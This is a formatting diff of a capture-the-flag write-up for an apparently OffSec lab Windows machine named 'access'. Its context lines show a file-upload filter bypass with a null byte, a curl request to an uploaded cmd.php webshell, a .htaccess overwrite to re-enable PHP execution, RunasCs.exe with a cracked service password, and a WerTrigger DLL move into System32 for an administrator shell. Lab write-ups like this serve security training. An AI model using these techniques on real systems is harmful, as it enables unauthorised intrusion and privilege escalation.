@@ -56,7 +56,7 @@ PORT    STATE SERVICE       VERSION
 Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
-We can take note of the domain name `access.offsec` and add it to our `/etc/hosts` file.&#x20;
+We can take note of the domain name `access.offsec` and add it to our `/etc/hosts` file.
 
 ### Port 80 -> File Upload Fail
 
@@ -101,7 +101,7 @@ This is bypassable using a null byte:
 
 <figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>
 
-However, when we view our file, it does not execute our code.&#x20;
+However, when we view our file, it does not execute our code.
 
 ```
 $ curl http://access.offsec/uploads/cmd.php%2500 
@@ -114,7 +114,7 @@ I found this pretty weird, why would NOT be executing PHP? I googled for what ca
 
 {% embed url="https://www.wpbeginner.com/wp-tutorials/how-to-disable-php-execution-in-certain-wordpress-directories/" %}
 
-Since we have an LFI, we can try to overwrite the current `.htaccess` file. This file sort of 'executes' for the directory it is in. So if we upload a `.htaccess` file to the `/uploads` directory allowing PHP exeuction, it should allow webshells to work within the `/uploads` directory only.&#x20;
+Since we have an LFI, we can try to overwrite the current `.htaccess` file. This file sort of 'executes' for the directory it is in. So if we upload a `.htaccess` file to the `/uploads` directory allowing PHP exeuction, it should allow webshells to work within the `/uploads` directory only.
 
 We can upload this file:
 
@@ -188,7 +188,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-The `svc_mssql` user is not part of the Remote Management Group, so we have to get a shell via `RunasCs.exe`.&#x20;
+The `svc_mssql` user is not part of the Remote Management Group, so we have to get a shell via `RunasCs.exe`.
 
 ```
 C:\Windows\Tasks>.\RunasCs.exe svc_mssql trustno1 whoami
@@ -243,7 +243,7 @@ C:\ NT AUTHORITY\SYSTEM:(OI)(CI)(F)
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-Using this, we can actually exploit WerTrigger to get an administrator shell.&#x20;
+Using this, we can actually exploit WerTrigger to get an administrator shell.
 
 ```
 C:\Users\svc_mssql\Desktop>move phoneinfo.dll C:\Windows\System32
